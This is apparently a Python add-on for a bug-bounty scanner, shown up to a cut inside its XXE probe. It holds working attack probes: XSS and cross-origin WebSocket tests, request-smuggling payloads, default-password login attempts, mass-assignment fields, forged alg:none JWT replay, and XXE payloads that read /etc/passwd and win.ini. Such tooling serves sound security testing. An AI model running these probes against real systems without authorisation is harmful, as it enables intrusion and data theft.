"""
BB Engines Additions — New engines to append to bb_engines.py
Run: python bb_engines_additions.py
This will append new engines to bb_engines.py safely.
"""

NEW_ENGINES_CODE = '''

# ══════════════════════════════════════════════════════════════════════════════
# 13. DOM XSS ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class DOMXSSEngine:
    """
    DOM-based XSS detection via static analysis of JS sinks and sources.
    Does NOT require a browser — uses regex on JS files and HTML.

    Checks for:
      - Dangerous sinks: innerHTML, outerHTML, document.write, eval,
        location.href assignment, location.replace, insertAdjacentHTML
      - User-controlled sources: location.hash, location.search,
        document.referrer, URLSearchParams
    """

    DANGEROUS_SINKS = [
        ("innerHTML",          "HIGH",    "innerHTML = ... allows HTML injection"),
        ("outerHTML",          "HIGH",    "outerHTML = ... allows HTML injection"),
        ("document.write",     "HIGH",    "document.write() renders unsanitized HTML"),
        ("document.writeln",   "HIGH",    "document.writeln() renders unsanitized HTML"),
        ("insertAdjacentHTML", "HIGH",    "insertAdjacentHTML() allows HTML injection"),
        ("eval(",              "CRITICAL","eval() executes arbitrary JS"),
        ("Function(",          "CRITICAL","Function() constructor executes arbitrary JS"),
        ("setTimeout(",        "MEDIUM",  "setTimeout(string) can execute code"),
        ("setInterval(",       "MEDIUM",  "setInterval(string) can execute code"),
        ("location.href",      "MEDIUM",  "location.href = userInput → open redirect / XSS"),
        ("location.replace(",  "MEDIUM",  "location.replace() with user input = open redirect"),
        ("location.assign(",   "MEDIUM",  "location.assign() with user input = open redirect"),
        ("window.open(",       "MEDIUM",  "window.open() with user input = redirect risk"),
        ("$.html(",            "HIGH",    "jQuery .html() renders unsanitized HTML"),
        ("$(",                 "LOW",     "jQuery selector may render unescaped HTML"),
    ]

    USER_SOURCES = [
        "location.hash",
        "location.search",
        "location.href",
        "document.referrer",
        "document.cookie",
        "URLSearchParams",
        "window.name",
        "postMessage",
    ]

    # Pattern: sink appears near a source (within 500 chars)
    SOURCE_PATTERN = re.compile(
        r'(?:' + '|'.join(re.escape(s) for s in [
            "location.hash", "location.search", "document.referrer",
            "URLSearchParams", "window.name", "postMessage",
            "getQueryParam", "getParameter", "decodeURI",
        ]) + r')',
        re.IGNORECASE
    )

    def analyze_js(self, js_text: str, source_url: str = "<inline>") -> List[Dict]:
        """
        Scan JS text for dangerous DOM sink patterns.
        Returns findings with line numbers and context.
        """
        findings = []
        lines = js_text.splitlines()

        for i, line in enumerate(lines, 1):
            # Check for sources in this line
            has_source = bool(self.SOURCE_PATTERN.search(line))

            for sink, severity, description in self.DANGEROUS_SINKS:
                if sink.lower() in line.lower():
                    # Upgrade severity if source is nearby (same line or ±5 lines)
                    ctx_start = max(0, i - 6)
                    ctx_end = min(len(lines), i + 5)
                    ctx_block = "\n".join(lines[ctx_start:ctx_end])
                    source_nearby = bool(self.SOURCE_PATTERN.search(ctx_block))

                    actual_sev = severity
                    flow_note = ""
                    if source_nearby:
                        if severity == "MEDIUM":
                            actual_sev = "HIGH"
                        elif severity == "LOW":
                            actual_sev = "MEDIUM"
                        flow_note = " [USER INPUT → SINK DATA FLOW DETECTED]"

                    # Skip obvious false positives (commented lines, string literals)
                    stripped = line.strip()
                    if stripped.startswith("//") or stripped.startswith("*"):
                        continue

                    findings.append({
                        "type": "dom_xss",
                        "sink": sink,
                        "severity": actual_sev,
                        "description": description + flow_note,
                        "line": i,
                        "code": line.strip()[:120],
                        "source_url": source_url,
                        "data_flow": source_nearby,
                    })

        # Deduplicate: same sink + same line
        seen = set()
        unique = []
        for f in findings:
            key = (f["sink"], f["line"])
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def scan_url(self, url: str) -> str:
        """Fetch a URL and scan all linked JS files for DOM XSS."""
        resp = _get(url, timeout=12)
        if not resp or resp.status_code != 200:
            return f"  ❌ Could not fetch {url}"

        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        page_text = resp.text or ""

        # Find all script src
        js_urls = []
        for m in re.finditer(r\'src=["\\\'](.*?\\.js(?:\\?[^"\\\']*)?)["\\\']\', page_text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("//"):
                js_urls.append("https:" + src)
            elif src.startswith("/"):
                js_urls.append(base + src)

        all_findings = []

        # Scan inline scripts
        inline = re.findall(r\'<script(?:[^>]*)>(.*?)</script>\', page_text, re.DOTALL | re.IGNORECASE)
        for i, block in enumerate(inline):
            all_findings.extend(self.analyze_js(block, f"{url}#inline-{i}"))

        # Scan external JS files (limit to 8)
        for js_url in js_urls[:8]:
            js_resp = _get(js_url, timeout=10)
            if js_resp and js_resp.status_code == 200:
                all_findings.extend(self.analyze_js(js_resp.text or "", js_url))

        return self.format_report(all_findings, url, len(js_urls))

    def format_report(self, findings: List[Dict], url: str = "", js_count: int = 0) -> str:
        """Format DOM XSS findings."""
        if not findings:
            return f"  ✅ No DOM XSS sinks found (scanned {js_count} JS file(s) + inline scripts)"

        # Filter: prioritize confirmed data flows
        confirmed_flows = [f for f in findings if f.get("data_flow")]
        other = [f for f in findings if not f.get("data_flow")]

        lines = [f"🌐 DOM XSS Analysis: {url}", "═" * 60]

        if confirmed_flows:
            lines.append(f"\\n  🔴 Confirmed Data Flows ({len(confirmed_flows)}) — USER INPUT → DANGEROUS SINK:")
            for f in confirmed_flows[:10]:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(f["severity"], "•")
                lines.append(f"    {icon} [{f['severity']}] Sink: `{f[\'sink\']}` at line {f[\'line\']}")
                lines.append(f"       File: {f[\'source_url\'].split(\'/\')[-1][:50]}")
                lines.append(f"       Code: {f[\'code\'][:100]}")

        if other:
            lines.append(f"\\n  🟡 Potential Sinks ({len(other)}) — Manual Review Needed:")
            for f in other[:8]:
                lines.append(f"    • [{f[\'severity\']}] `{f[\'sink\']}` at line {f[\'line\']} — {f[\'description\'][:80]}")

        lines.append(f"\\n  ➜ Use Playwright/headless Chrome to dynamically confirm DOM XSS")
        return "\\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 14. WEBSOCKET ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class WebSocketEngine:
    """
    Basic WebSocket security testing.
    Tests for:
      - Missing authentication (unauthenticated WS connection)
      - Missing Origin check (WS CSRF)
      - Reflected data in messages (WS-XSS)
      - Message-based injection (XSS/SQLi in WS messages)

    Requires: websocket-client (pip install websocket-client)
    Gracefully skips if not installed.
    """

    def _check_ws_available(self):
        try:
            import websocket
            return True
        except ImportError:
            return False

    def test_connection(self, ws_url: str, origin: str = "https://evil.com",
                        timeout: int = 8) -> Dict:
        """
        Attempt to connect to a WebSocket endpoint.
        Returns connection result dict.
        """
        if not self._check_ws_available():
            return {
                "error": "websocket-client not installed. Run: pip install websocket-client",
                "install_hint": "pip install websocket-client",
            }

        import websocket as ws_lib
        result = {
            "url": ws_url,
            "connected": False,
            "accepted_evil_origin": False,
            "messages": [],
            "error": None,
        }

        try:
            ws = ws_lib.create_connection(
                ws_url,
                timeout=timeout,
                header={"Origin": origin},
                suppress_origin=False,
            )
            result["connected"] = True
            result["accepted_evil_origin"] = True  # Connected with evil origin!

            # Try to receive any initial messages
            ws.settimeout(3)
            try:
                msg = ws.recv()
                result["messages"].append({"direction": "recv", "data": str(msg)[:200]})
            except Exception:
                pass

            # Send XSS probe
            xss_payload = "<script>alert('ws-xss')</script>"
            try:
                ws.send(xss_payload)
                ws.settimeout(3)
                response = ws.recv()
                result["messages"].append({"direction": "send", "data": xss_payload})
                result["messages"].append({"direction": "recv", "data": str(response)[:200]})
                if xss_payload.lower() in (response or "").lower():
                    result["xss_reflected"] = True
            except Exception:
                pass

            ws.close()
        except Exception as e:
            result["error"] = str(e)[:200]

        return result

    def discover_ws_endpoints(self, page_url: str) -> List[str]:
        """Scan a page HTML for WebSocket URLs (ws:// or wss://)."""
        resp = _get(page_url, timeout=12)
        if not resp or resp.status_code != 200:
            return []
        text = resp.text or ""
        pattern = re.compile(r\'(wss?://[^"\\\' \\t\\n<>]{5,100})\', re.IGNORECASE)
        endpoints = list(set(pattern.findall(text)))
        return endpoints[:10]

    def scan(self, target: str) -> str:
        """Scan a URL for WebSocket endpoints and test security."""
        if not self._check_ws_available():
            return ("  ⚠️  websocket-client not installed.\\n"
                    "  Install with: pip install websocket-client\\n"
                    "  Then re-run: /bugbounty websocket <url>")

        lines = [f"🔌 WebSocket Security Scan: {target}", "═" * 55]

        # Discover WS endpoints from page
        if target.startswith("http"):
            ws_urls = self.discover_ws_endpoints(target)
        else:
            ws_urls = [target]

        if not ws_urls:
            lines.append("  ℹ️  No WebSocket endpoints found in page source.")
            lines.append("  💡 Tip: Check browser DevTools Network tab → WS filter")
            return "\\n".join(lines)

        lines.append(f"  Found {len(ws_urls)} WebSocket endpoint(s):")
        for ws_url in ws_urls:
            lines.append(f"\\n  📡 Testing: {ws_url}")
            result = self.test_connection(ws_url)

            if result.get("error") and not result.get("connected"):
                lines.append(f"    ❌ Connection failed: {result[\'error\'][:80]}")
                continue

            if result.get("accepted_evil_origin"):
                lines.append(f"    🟠 [HIGH] WebSocket accepts connections from cross-origin (evil.com)!")
                lines.append(f"       Impact: WebSocket CSRF — malicious sites can connect as the victim")

            if result.get("xss_reflected"):
                lines.append(f"    🔴 [HIGH] XSS payload reflected back in WebSocket message!")
                lines.append(f"       Impact: WebSocket-based XSS may be exploitable")

            for msg in result.get("messages", [])[:3]:
                direction = "→ SENT" if msg["direction"] == "send" else "← RECV"
                lines.append(f"    {direction}: {msg[\'data\'][:80]}")

        return "\\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 15. REQUEST SMUGGLING ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class RequestSmugglingEngine:
    """
    HTTP Request Smuggling detection (CL.TE and TE.CL techniques).

    CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding.
    TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length.

    Uses raw sockets for precise header control (requests/httpx cannot do this).
    """

    def _raw_request(self, host: str, port: int, request_bytes: bytes,
                     timeout: int = 10) -> bytes:
        """Send a raw HTTP/HTTPS request and return the response bytes."""
        import socket as _sock
        try:
            if port == 443:
                import ssl
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(
                    _sock.create_connection((host, port), timeout=timeout),
                    server_hostname=host
                )
            else:
                sock = _sock.create_connection((host, port), timeout=timeout)
            sock.sendall(request_bytes)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 16384:
                    break
            sock.close()
            return resp
        except Exception as e:
            logger.debug(f"Raw socket error: {e}")
            return b""

    def test_cl_te(self, url: str) -> Dict:
        """
        CL.TE smuggling probe.
        Sends a request where Content-Length says data is done,
        but Transfer-Encoding chunked carries extra data.
        """
        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        # CL.TE: Ambiguous request — backend processes the extra \'G\'
        # If smuggled, subsequent request will see \'GPOST /...\'
        payload = (
            f"POST {path} HTTP/1.1\\r\\n"
            f"Host: {host}\\r\\n"
            f"Content-Type: application/x-www-form-urlencoded\\r\\n"
            f"Content-Length: 6\\r\\n"
            f"Transfer-Encoding: chunked\\r\\n"
            f"\\r\\n"
            f"0\\r\\n"
            f"\\r\\n"
            f"G"
        ).encode()

        start = time.time()
        try:
            resp = self._raw_request(host, port, payload, timeout=10)
            elapsed = time.time() - start
            resp_text = resp.decode("utf-8", errors="replace")

            # Timeout-based detection: server hanging indicates partial body read
            if elapsed > 5 and b"400" not in resp[:50] and b"408" not in resp[:50]:
                return {
                    "technique": "CL.TE",
                    "confirmed": "possible",
                    "evidence": f"Request took {elapsed:.1f}s — possible smuggling hang",
                    "severity": "HIGH",
                    "elapsed": elapsed,
                }
            # Error response can also indicate smuggling detected
            if b"400" in resp[:100]:
                return {
                    "technique": "CL.TE",
                    "confirmed": False,
                    "evidence": "400 Bad Request — TE header may be stripped",
                }
        except Exception as e:
            return {"technique": "CL.TE", "confirmed": False, "error": str(e)}

        return {"technique": "CL.TE", "confirmed": False, "evidence": "No anomaly"}

    def test_te_cl(self, url: str) -> Dict:
        """
        TE.CL smuggling probe.
        Frontend strips Transfer-Encoding, backend keeps it.
        """
        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        payload = (
            f"POST {path} HTTP/1.1\\r\\n"
            f"Host: {host}\\r\\n"
            f"Content-Type: application/x-www-form-urlencoded\\r\\n"
            f"Content-Length: 3\\r\\n"
            f"Transfer-Encoding: chunked\\r\\n"
            f"\\r\\n"
            f"1\\r\\n"
            f"G\\r\\n"
            f"0\\r\\n"
            f"\\r\\n"
        ).encode()

        start = time.time()
        try:
            resp = self._raw_request(host, port, payload, timeout=10)
            elapsed = time.time() - start
            resp_text = resp.decode("utf-8", errors="replace")

            if elapsed > 5:
                return {
                    "technique": "TE.CL",
                    "confirmed": "possible",
                    "evidence": f"Request took {elapsed:.1f}s — possible backend hang on partial chunk",
                    "severity": "HIGH",
                    "elapsed": elapsed,
                }
        except Exception as e:
            return {"technique": "TE.CL", "confirmed": False, "error": str(e)}

        return {"technique": "TE.CL", "confirmed": False, "evidence": "No anomaly"}

    def scan(self, url: str) -> str:
        """Run both CL.TE and TE.CL probes against a target."""
        lines = [f"🚢 HTTP Request Smuggling Probe: {url}", "═" * 55,
                 "  ⚠️  Note: Timing-based — requires network stability for accuracy"]

        for test_fn in [self.test_cl_te, self.test_te_cl]:
            try:
                result = test_fn(url)
                tech = result.get("technique", "?")

                if result.get("confirmed") == "possible":
                    lines.append(f"\\n  🟠 [HIGH] Possible {tech} Smuggling detected!")
                    lines.append(f"       Evidence: {result.get(\'evidence\', \'\')}")
                    lines.append(f"       Time elapsed: {result.get(\'elapsed\', 0):.2f}s")
                    lines.append(f"       💡 Verify with Burp Suite Pro → HTTP Request Smuggler extension")
                elif result.get("error"):
                    lines.append(f"  ⚠️  {tech}: Socket error — {result[\'error\'][:60]}")
                else:
                    lines.append(f"  ✅ {tech}: No smuggling indicators (response normal)")
            except Exception as e:
                lines.append(f"  ⚠️  {test_fn.__name__}: {e}")

        lines.append("\\n  ➜ For definitive detection, use: https://github.com/defparam/smuggler")
        return "\\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# ENHANCEMENTS: Existing classes — monkey-patched additions
# ══════════════════════════════════════════════════════════════════════════════


# ── AuthSessionEngine: test_login_bypass, test_mass_assignment ───────────────

def _ase_test_login_bypass(self, login_url: str, username_field: str = "username",
                            password_field: str = "password") -> str:
    """
    Test for default credentials and login bypass.
    Sends common default username/password combinations.
    """
    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("administrator", "administrator"), ("admin", "letmein"),
        ("test", "test"), ("guest", "guest"), ("user", "user"),
        ("admin", "pass"), ("admin", "1234"), ("admin", "Password1"),
        ("admin", "P@ssw0rd"), ("admin", "changeme"), ("admin", ""),
        ("", "admin"), ("admin", "admin1"), ("superadmin", "superadmin"),
    ]

    lines = [f"🔓 Login Bypass Test: {login_url}", "─" * 55]
    findings = []

    # Baseline: fetch the login page
    baseline = _get(login_url, timeout=8)
    if not baseline:
        return "  ❌ Cannot reach login URL"
    baseline_len = len(baseline.content)
    baseline_status = baseline.status_code

    for username, password in DEFAULT_CREDS:
        try:
            resp = _post(login_url, data={username_field: username, password_field: password},
                         timeout=8)
            if not resp:
                continue

            # Indicators of successful login:
            # 1. Redirect to a non-login page
            if resp.status_code in [301, 302, 303, 307, 308]:
                loc = resp.headers.get("Location", "")
                if loc and "login" not in loc.lower() and "error" not in loc.lower():
                    findings.append({
                        "username": username, "password": password,
                        "status": resp.status_code, "location": loc,
                        "message": f"Possible login with {username}:{password} → redirects to {loc}",
                    })

            # 2. Response significantly longer than failed login
            elif resp.status_code == 200:
                len_diff = len(resp.content) - baseline_len
                body = (resp.text or "").lower()
                # Look for success indicators
                success_indicators = [
                    "dashboard", "logout", "sign out", "welcome",
                    "profile", "account", "settings", "home",
                ]
                if any(ind in body for ind in success_indicators) and len_diff > 500:
                    findings.append({
                        "username": username, "password": password,
                        "status": resp.status_code, "len_diff": len_diff,
                        "message": f"Possible login with {username}:{password} (success indicators in body)",
                    })
        except Exception:
            continue

    if findings:
        lines.append(f"  🔴 {len(findings)} possible default credential(s) found!")
        for f in findings:
            lines.append(f"    🔴 [CRITICAL] {f[\'username\']}:{f[\'password\']} → {f[\'message\'][:100]}")
        lines.append("  ➜ Verify manually — these may be true positives!")
    else:
        lines.append(f"  ✅ No default credentials worked ({len(DEFAULT_CREDS)} combinations tested)")
        lines.append(f"  💡 Also test: /admin, /wp-admin, /phpmyadmin for admin panels")

    return "\\n".join(lines)


def _ase_test_mass_assignment(self, url: str, extra_fields: dict = None) -> str:
    """
    Test for mass assignment vulnerability by sending extra fields
    like role=admin, isAdmin=true, is_admin=1 in POST/PUT requests.
    """
    MASS_ASSIGN_PAYLOADS = [
        {"role": "admin"},
        {"isAdmin": "true"},
        {"is_admin": "1"},
        {"admin": "true"},
        {"privilege": "admin"},
        {"userType": "admin"},
        {"account_type": "premium"},
        {"subscription": "enterprise"},
        {"verified": "true"},
        {"email_verified": "true"},
    ]

    if extra_fields:
        MASS_ASSIGN_PAYLOADS.insert(0, extra_fields)

    lines = [f"🏋️  Mass Assignment Test: {url}", "─" * 55]

    # Baseline GET
    baseline = _get(url, timeout=8)
    if not baseline:
        return f"  ❌ Cannot reach {url}"

    baseline_body = (baseline.text or "").lower()
    findings = []

    for payload in MASS_ASSIGN_PAYLOADS:
        try:
            resp = _post(url, data=payload, timeout=8)
            if not resp:
                continue
            body = (resp.text or "").lower()

            # Look for elevated privilege indicators in response
            indicators = ["admin", "superuser", "privilege", "role", "verified"]
            for ind in indicators:
                if ind in body and ind not in baseline_body:
                    key = list(payload.keys())[0]
                    val = list(payload.values())[0]
                    findings.append({
                        "payload": payload,
                        "indicator": ind,
                        "message": f"Mass assignment: server reflected \'{ind}\' after sending {key}={val}",
                    })
                    break
        except Exception:
            continue

    if findings:
        lines.append(f"  🟠 {len(findings)} potential mass assignment issue(s):")
        for f in findings:
            lines.append(f"    🟠 [HIGH] {f[\'message\']}")
    else:
        lines.append(f"  ✅ No mass assignment indicators found ({len(MASS_ASSIGN_PAYLOADS)} payloads tested)")
        lines.append("  💡 Also test PUT/PATCH endpoints — they\'re more likely to be vulnerable")

    return "\\n".join(lines)


AuthSessionEngine.test_login_bypass = _ase_test_login_bypass
AuthSessionEngine.test_mass_assignment = _ase_test_mass_assignment


# ── JWTScanner: active token testing ─────────────────────────────────────────

def _jwt_test_forged_against_server(self, original_token: str, test_url: str,
                                     auth_header: str = "Authorization") -> Dict:
    """
    Actually send the forged alg:none token to the server and check response.
    Returns dict with confirmed bool and evidence.
    """
    forged = self._forge_alg_none(original_token)
    if not forged:
        return {"confirmed": False, "reason": "Could not forge alg:none token"}

    # Baseline: request without auth
    no_auth = _get(test_url, timeout=8)
    baseline_status = getattr(no_auth, "status_code", 0)
    baseline_len = len(getattr(no_auth, "content", b""))

    # Test with forged token
    test_resp = _get(test_url, headers={auth_header: f"Bearer {forged}"}, timeout=8)
    if not test_resp:
        return {"confirmed": False, "reason": "No response from server"}

    # Test with original token
    orig_resp = _get(test_url, headers={auth_header: f"Bearer {original_token}"}, timeout=8)
    orig_status = getattr(orig_resp, "status_code", 0)
    orig_len = len(getattr(orig_resp, "content", b""))

    forged_status = test_resp.status_code
    forged_len = len(test_resp.content)

    result = {
        "forged_token": forged[:80] + "...",
        "baseline_status": baseline_status,
        "original_token_status": orig_status,
        "forged_token_status": forged_status,
        "url": test_url,
    }

    # Confirmed if forged token gets same access as original
    if (orig_status == 200 and forged_status == 200 and
            abs(forged_len - orig_len) < orig_len * 0.1):
        result.update({
            "confirmed": True,
            "severity": "CRITICAL",
            "evidence": f"Forged alg:none token accepted! Same response as valid token (status {forged_status}, size {forged_len}b)",
        })
    elif forged_status == 200 and baseline_status != 200:
        result.update({
            "confirmed": "possible",
            "severity": "HIGH",
            "evidence": f"Forged token got {forged_status} while no-auth got {baseline_status} — suspicious",
        })
    else:
        result.update({
            "confirmed": False,
            "reason": f"Forged token rejected (status {forged_status})",
        })

    return result


JWTScanner.test_forged_against_server = _jwt_test_forged_against_server


# ── CVSS31Calculator: suggest_vector ─────────────────────────────────────────

def _cvss_suggest_vector(self, vuln_type: str) -> str:
    """
    Suggest a CVSS 3.1 vector string based on vulnerability type.
    Returns a pre-filled vector + calculated score.
    """
    VULN_VECTORS = {
        "xss_reflected":      ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Reflected XSS"),
        "xss_stored":         ("AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", "Stored XSS"),
        "sql_injection":      ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
        "sqli":               ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
        "open_redirect":      ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Open Redirect"),
        "ssrf":               ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "SSRF"),
        "idor":               ("AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "IDOR"),
        "cors":               ("AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", "CORS Misconfiguration"),
        "ssti":               ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "SSTI / RCE"),
        "path_traversal":     ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "Path Traversal / LFI"),
        "missing_header":     ("AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N", "Missing Security Header"),
        "csrf":               ("AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", "CSRF"),
        "subdomain_takeover": ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "Subdomain Takeover"),
        "jwt_weak_secret":    ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT Weak Secret"),
        "jwt_alg_none":       ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT alg:none bypass"),
        "rce":                ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Remote Code Execution"),
        "xxe":                ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L", "XXE Injection"),
        "crlf":               ("AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", "CRLF Injection"),
        "host_header":        ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Host Header Injection"),
        "sensitive_file":     ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Sensitive File Exposure"),
        "prototype_pollution": ("AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N", "Prototype Pollution"),
    }

    key = vuln_type.lower().replace("-", "_").replace(" ", "_")
    if key not in VULN_VECTORS:
        # Try partial match
        for k in VULN_VECTORS:
            if k in key or key in k:
                key = k
                break
        else:
            available = ", ".join(VULN_VECTORS.keys())
            return f"  ❌ Unknown vuln type. Available: {available}"

    vector, name = VULN_VECTORS[key]
    result = self.calculate(vector)
    report = self.format_report(result)

    lines = [
        f"🎯 CVSS Suggestion for: {name}",
        f"  Vector: {vector}",
        report,
        "",
        f"  💡 This is a typical vector. Adjust PR/AC/UI/S based on your specific finding.",
    ]
    return "\\n".join(lines)


CVSS31Calculator.suggest_vector = _cvss_suggest_vector


# ── ShodanEngine: EPSS lookup ─────────────────────────────────────────────────

def _shodan_get_epss_scores(self, cves: List[str]) -> Dict[str, Dict]:
    """
    Fetch EPSS (Exploit Prediction Scoring System) probability scores
    for a list of CVE IDs. Uses the free Cyentia EPSS API.
    Returns {cve_id: {"epss": float, "percentile": float}}.
    """
    if not cves:
        return {}
    # EPSS API accepts comma-separated CVE IDs (max ~30)
    cve_list = ",".join(cves[:20])
    url = f"https://api.first.org/data/v1/epss?cve={cve_list}"
    resp = _get(url, timeout=12)
    if not resp or resp.status_code != 200:
        return {}
    try:
        data = resp.json().get("data", [])
        return {
            entry["cve"]: {
                "epss":       float(entry.get("epss", 0)),
                "percentile": float(entry.get("percentile", 0)),
            }
            for entry in data
            if "cve" in entry
        }
    except Exception:
        return {}


def _shodan_format_report_with_epss(self, result: Dict) -> str:
    """Extended format_report that includes EPSS scores for CVEs."""
    base_report = ShodanEngine.format_report.__wrapped__(self, result) if hasattr(ShodanEngine.format_report, \'__wrapped__\') else ""

    cves = result.get("cves", [])
    if not cves or "error" in result or result.get("note"):
        return base_report  # Fall back to base report

    # Get EPSS scores
    epss_scores = self.get_epss_scores(cves)

    lines = [
        f"🌐 Shodan InternetDB: {result.get(\'target\', result.get(\'ip\', \'?\'))}",
        f"   IP: {result.get(\'ip\', \'?\')}",
        "═" * 55,
    ]

    ports = result.get("ports", [])
    if ports:
        lines.append(f"  📡 Open Ports ({len(ports)}): {\', \'.join(str(p) for p in ports[:20])}")
        dangerous = [p for p in ports if p in [21, 22, 23, 25, 3306, 5432, 27017, 6379, 11211, 9200, 5601]]
        port_names = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 3306: "MySQL",
                      5432: "PostgreSQL", 27017: "MongoDB", 6379: "Redis",
                      11211: "Memcached", 9200: "Elasticsearch", 5601: "Kibana"}
        for p in dangerous:
            lines.append(f"    🔴 Port {p} ({port_names.get(p, \'?\')}) is open!")

    if cves:
        lines.append(f"\\n  🚨 Known CVEs ({len(cves)}) with EPSS Exploit Probability:")
        for cve in cves[:10]:
            epss = epss_scores.get(cve, {})
            epss_pct = epss.get("epss", 0) * 100
            percentile = epss.get("percentile", 0) * 100
            if epss_pct > 10:
                risk_icon = "🔴"
                risk_label = f"HIGH EXPLOIT RISK: {epss_pct:.1f}% probability"
            elif epss_pct > 1:
                risk_icon = "🟠"
                risk_label = f"Moderate exploit risk: {epss_pct:.1f}%"
            else:
                risk_icon = "🟡"
                risk_label = f"Low exploit risk: {epss_pct:.2f}%"

            lines.append(f"    {risk_icon} {cve}")
            if epss:
                lines.append(f"       EPSS: {epss_pct:.2f}% exploit prob | Percentile: {percentile:.0f}th")
            lines.append(f"       → https://nvd.nist.gov/vuln/detail/{cve}")
    else:
        lines.append("  ✅ No known CVEs indexed")

    cpes = result.get("cpes", [])
    if cpes:
        lines.append(f"\\n  🖥️  Software (CPE): {', '.join(cpes[:6])}")

    tags = result.get("tags", [])
    if tags:
        lines.append(f"\\n  🏷️  Tags: {', '.join(tags)}")

    lines.append("\\n" + "═" * 55)
    return "\\n".join(lines)


ShodanEngine.get_epss_scores = _shodan_get_epss_scores
ShodanEngine.format_report = _shodan_format_report_with_epss


# ══════════════════════════════════════════════════════════════════════════════
# 16. XXE PROBE ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class XXEProbeEngine:
    """
    XML External Entity (XXE) injection testing.
    Tests XML-accepting endpoints for:
      1. File read via classic XXE (expect /etc/passwd or Windows equivalents)
      2. OOB XXE via Interactsh for blind detection
      3. Error-based XXE
      4. Parameter entity XXE
    """

    XXE_PAYLOADS = [
        # Classic file read
        (
            "xxe_classic",
            "HIGH",
            \'\'\'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>\'\'\',
            ["root:", "nobody:", "/bin/bash", "/sbin/nologin"],
        ),
        # Windows file read
        (
            "xxe_windows",
            "HIGH",
            \'\'\'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>\'\'\',
            ["[fonts]", "[extensions]", "[files]", "for 16-bit"],
        ),
        # Error-based XXE
        (
            "xxe_error",
            "MEDIUM",
            \'\'\'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/nonexistent_bb_probe">
  %xxe;
]>
<root/>\'\'\',
            ["nonexistent", "No such file", "error", "DOCTYPE"],
        ),
    ]

    def probe(self, url: str, use_oob: bool = True) -> List[Dict]:
        """
        Test a URL for XXE by sending XML payloads.
        Tries common XML content types.
        """
        findings = []
        content_types = [
            "application/xml",
            "text/xml",
            "application/soap+xml",
        ]

        # OOB setup via Interactsh
        oob = None
        if use_oob:
            oob = _interactsh_setup()

        for ct in content_types:
            for xx_id, severity, payload_text, indicators in self.XXE_PAYLOADS:
                try:
                    resp = _post(
                        url,
                        data=payload_text.encode("utf-8"),
                        headers={"Content-Type": ct},
                        timeout=10,
                    )
                    if not resp:
                        continue

                    body = resp.text or ""

                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            findings.append({
                                "type": f"xxe_{xx_id}",
                                "severity": severity,
                                "url": url,
                                "content_type": ct,
                                "indicator": indicator,
                                "message": f"XXE file read confirmed! Found \'{indicator}\' in response",
                                "confirmed": True,
                            })
                            break

                    # Check for error-based disclosure
                    if resp.status_code in [500, 400] and any(
                        ind in body.lower() for ind in ["xml", "entity", "doctype", "parse"]
                    ):
                        findings.append({
                            "type": "xxe_error_disclosure",
                            "severity": "MEDIUM",
                            "url": url,
                            "content_type": ct,
                            "message": f"XML parsing error in response — server processes XML with {ct}",
                            "evidence": body[:200],
                            "confirmed": "possible",
                        })

                except Exception:
                    continue

